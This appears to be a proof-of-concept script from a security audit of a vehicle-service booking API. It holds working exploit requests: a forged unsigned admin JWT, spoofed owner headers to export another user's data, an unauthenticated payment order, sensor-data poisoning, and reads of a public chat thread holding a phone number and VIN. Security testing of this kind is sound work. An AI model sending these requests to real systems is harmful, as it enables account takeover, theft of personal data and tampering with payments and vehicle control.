// Runtime security probes for vehicle-service-booking-system.
// Run from repo root with:
//   bun run /tmp/codex-security-scans/vehicle-service-booking-system/ad39041_20260509T021309Z/artifacts/pocs/runtime-probes.ts

process.env.NODE_ENV = "production";
process.env.AUTONOMY_ENABLED = "true";
process.env.MERCEDES_IPP_MODE = "sim";
process.env.PAYMENT_MODE = "sim";
process.env.AUTH_MODE = "sim";

const { default: app } = await import("../../../../../../mnt/experiments/vehicle-service-booking-system/apps/api/src/server.ts");
const { simSignOwner } = await import("../../../../../../mnt/experiments/vehicle-service-booking-system/packages/shared/src/commandgrant-lifecycle.ts");

function b64u(obj: unknown): string {
  return Buffer.from(JSON.stringify(obj)).toString("base64url");
}

function req(path: string, init: RequestInit = {}): Request {
  return new Request(`http://local${path}`, init);
}

function jsonReq(path: string, body: unknown, headers: Record<string, string> = {}): Request {
  return req(path, {
    method: "POST",
    headers: { "content-type": "application/json", ...headers },
    body: JSON.stringify(body),
  });
}

const forgedAdmin = `${b64u({ alg: "none", typ: "JWT" })}.${b64u({
  sub: "attacker",
  role: "admin",
  exp: Math.floor(Date.now() / 1000) + 3600,
})}.`;

const adminRes = await app.fetch(req("/v1/admin/bookings", {
  headers: { "x-goog-iap-jwt-assertion": forgedAdmin },
}));
console.log("forged admin header -> /v1/admin/bookings", adminRes.status);

const exportRes = await app.fetch(req("/v1/me/data-export", {
  headers: { "x-vsbs-owner": "victim-owner-id" },
}));
const exportBody = await exportRes.text();
console.log(
  "spoofed x-vsbs-owner -> /v1/me/data-export",
  exportRes.status,
  exportBody.includes("victim-owner-id"),
);

const paymentRes = await app.fetch(jsonReq("/v1/payments/orders", {
  bookingId: crypto.randomUUID(),
  amount: { currency: "INR", amountMinor: 12345 },
  idempotencyKey: "audit-idempotency-key-0001",
}));
console.log("unauth payment order create", paymentRes.status);

const grantBase = {
  grantId: crypto.randomUUID(),
  vehicleId: "veh-audit-1",
  granteeSvcCenterId: "svc-audit-1",
  tier: "A-AVP",
  scopes: ["drive-to-bay"],
  notBefore: new Date().toISOString(),
  notAfter: new Date(Date.now() + 300_000).toISOString(),
  geofence: { lat: 48.78, lng: 9.18, radiusMeters: 400 },
  maxAutoPayInr: 10000,
  mustNotify: ["start"],
  ownerSigAlg: "ed25519",
};
const ownerSignatureB64 = await simSignOwner(grantBase);
const grantRes = await app.fetch(jsonReq("/v1/autonomy/grant/sign", {
  ...grantBase,
  ownerSignatureB64,
  witnessSignaturesB64: {},
}));
console.log("sim-signed autonomy grant", grantRes.status);

await app.fetch(jsonReq("/v1/scenarios/bootstrap-consent", {
  userId: "victim-owner-id",
  purposes: ["diagnostic-telemetry"],
}));
const sensorRes = await app.fetch(jsonReq("/v1/sensors/ingest", {
  vehicleId: "veh-victim-1",
  samples: [{
    channel: "gps",
    timestamp: new Date().toISOString(),
    origin: "real",
    vehicleId: "veh-victim-1",
    value: { lat: 19.076, lng: 72.8777 },
  }],
}, { "x-vsbs-owner": "victim-owner-id" }));
const latestRes = await app.fetch(req("/v1/sensors/veh-victim-1/latest"));
const latestBody = await latestRes.text();
console.log("unauth sensor poison/read", sensorRes.status, latestRes.status, latestBody.includes("19.076"));

const turnRes = await app.fetch(jsonReq("/v1/concierge/turn", {
  conversationId: "victim-thread",
  userMessage: "My phone is +919876543210 and VIN is 1HGCM82633A004352",
}));
await turnRes.text();
const threadRes = await app.fetch(req("/v1/concierge/threads/victim-thread"));
const threadBody = await threadRes.text();
console.log("public concierge thread read", threadRes.status, threadBody.includes("9876543210"));
